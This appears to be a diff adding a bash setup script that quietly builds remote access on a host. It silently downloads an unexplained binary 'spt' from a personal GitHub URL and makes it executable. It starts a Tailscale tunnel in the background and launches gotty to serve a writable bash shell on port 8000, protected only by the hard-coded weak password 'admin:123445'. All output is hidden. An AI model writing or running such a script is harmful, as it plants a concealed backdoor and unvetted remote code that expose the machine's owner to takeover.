@@ -1,0 +1,71 @@
+#!/bin/bash
+set -e
+
+ROOT="$(pwd)"
+HOME_DIR="$HOME"
+
+LINUX_DIR="$ROOT/linux"
+BIN_DIR="$LINUX_DIR/usr/bin"
+
+TS_ROOT="$HOME_DIR/tailscale"
+TS_BIN="$TS_ROOT/bin"
+TS_STATE="$TS_ROOT/state"
+TS_SOCKET_DIR="$TS_ROOT/socket"
+TS_SOCKET="$TS_SOCKET_DIR/tailscaled.sock"
+
+GOTTY_TMP="$ROOT/gotty.tar.gz"
+
+mkdir -p \
+  "$LINUX_DIR/usr/bin" \
+  "$LINUX_DIR/bin" \
+  "$LINUX_DIR/usr/sbin" \
+  "$LINUX_DIR/sbin" \
+  "$TS_BIN" \
+  "$TS_STATE" \
+  "$TS_SOCKET_DIR"
+
+LINE1="$(find "$LINUX_DIR" -type d 2>/dev/null | paste -sd ':' - || true)"
+
+export PATH="$LINE1:$PATH"
+export LD_LIBRARY_PATH="$LINE1${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
+export LIBRARY_PATH="$LINE1${LIBRARY_PATH:+:$LIBRARY_PATH}"
+
+curl -fsSL -o "$LINUX_DIR/bin/spt" \
+  https://raw.githubusercontent.com/yjing-833/te/refs/heads/main/spt \
+  > /dev/null 2>&1
+
+chmod +x "$LINUX_DIR/bin/spt"
+
+if [ ! -f "$TS_BIN/tailscaled" ] || [ ! -f "$TS_BIN/tailscale" ]; then
+  curl -fsSL https://pkgs.tailscale.com/stable/tailscale_latest_amd64.tgz \
+  | tar --strip-components=1 -xzf - -C "$TS_BIN" \
+  > /dev/null 2>&1
+fi
+
+chmod +x "$TS_BIN/tailscale" "$TS_BIN/tailscaled"
+
+export TS_SOCKET="$TS_SOCKET"
+
+nohup "$TS_BIN/tailscaled" \
+  --tun=userspace-networking \
+  --state="$TS_STATE/tailscaled.state" \
+  --socket="$TS_SOCKET" \
+  --port 41641 \
+  > /dev/null 2>&1 &
+
+sleep 2
+
+"$TS_BIN/tailscale" --socket="$TS_SOCKET" up > "$TS_ROOT/tailscale.log" 2>&1
+
+curl -# -SLo "$GOTTY_TMP" \
+  "https://github.com/yudai/gotty/releases/latest/download/gotty_linux_amd64.tar.gz" \
+  > /dev/null 2>&1
+
+tar -xzf "$GOTTY_TMP" -C "$BIN_DIR"
+
+chmod +x "$BIN_DIR/gotty"
+
+rm -f "$GOTTY_TMP"
+
+nohup "$BIN_DIR/gotty" -w -p 8000 -c "admin:123445" bash \
+  > /dev/null 2>&1 &
